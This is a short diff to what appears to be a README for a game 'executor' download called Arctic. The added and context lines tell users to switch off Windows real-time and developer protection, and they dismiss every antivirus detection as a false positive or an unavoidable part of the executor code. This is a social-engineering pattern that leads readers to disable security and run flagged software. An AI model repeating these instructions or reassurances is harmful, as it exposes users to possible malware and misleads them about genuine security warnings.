@@ -62,6 +62,10 @@ Arctic’s hypothetical codebase is a dream for developers and reverse engineers
 
 
 
+
+
+virus scanner websites will flag it with multiple random softwares we DONT use we cannot fix this as it is apart of the executor code
+
 turn off allat windows saftey or it wont work just turn off real time and dev protection! 
 discord server pop-up after download 
 any virus or "malware" windows detects is false postivie
